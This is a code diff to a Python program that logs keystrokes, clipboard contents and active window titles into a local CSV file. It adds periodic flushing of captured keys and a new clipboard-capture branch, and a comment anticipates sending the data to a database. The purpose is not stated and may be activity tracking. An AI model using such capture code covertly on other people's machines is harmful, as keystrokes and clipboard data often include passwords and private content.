@@ -43,7 +43,7 @@ def main():
         # Add code for sending data to database here.
         os.remove("logged_data.csv")
     old_date_and_time = time.time()
-    note_interval_seconds = 2
+    note_interval_seconds = 60
 
     with open('logged_data.csv', 'a+', newline='') as f, open('text_file.txt', 'w+') as txt_file:
         csvreader = csv.writer(f)
@@ -51,21 +51,24 @@ def main():
         kc_logger_object = kclogger.KeysClipboardLogger(csvreader, txt_file)  # Start keylogger.
         window_logger_object = wilogger.WindowLogger(csvreader)  # Start window logger.
         while True:
-            # csv_file.writerow(["datetime", "window_title", "data_ID", "logged_data"])
-
-            # if window change
-            if window_logger_object.screen_changed():
-                window_title = window_logger_object.log_window()  # TODO: also add application title!
+            # if window change or time has passed
+            if window_logger_object.screen_changed() or check_if_time_passed(old_date_and_time, note_interval_seconds):
+                window_title = window_logger_object.log_window()
                 kc_logger_object.stop_keylogger()
                 logged_keys = kc_logger_object.get_current_logged_keys()
                 data_id = 0
                 # save currently logged data to csv with old time + old app & window data + data ID = 0
-                csvreader.writerow([f"{time_to_datetime(old_date_and_time)}", f"{window_title}", f"{data_id}", f"{logged_keys}"])
+                csvreader.writerow(
+                    [f"{time_to_datetime(old_date_and_time)}", f"{window_title}", f"{data_id}", f"{logged_keys}"])
                 old_date_and_time = time.time()
                 kc_logger_object.start_keylogger()
-            # if minute passed
-                # save currently logged data to csv with old time + old / current app & window data + data ID = 0
             # if clipboard changed
+            if kc_logger_object.clipboard_changed():
+                clipboard_date_and_time, data = kc_logger_object.log_clipboard()
+                window_title = window_logger_object.log_window()
+                data_id = 1
+                csvreader.writerow(
+                    [f"{time_to_datetime(clipboard_date_and_time)}", f"{window_title}", f"{data_id}", f"{data}"])
                 # save currently logged data to csv with old time + old / current app & window data
                 # save clipboard data to csv with new time + old / current app & window data + data ID = 1
 
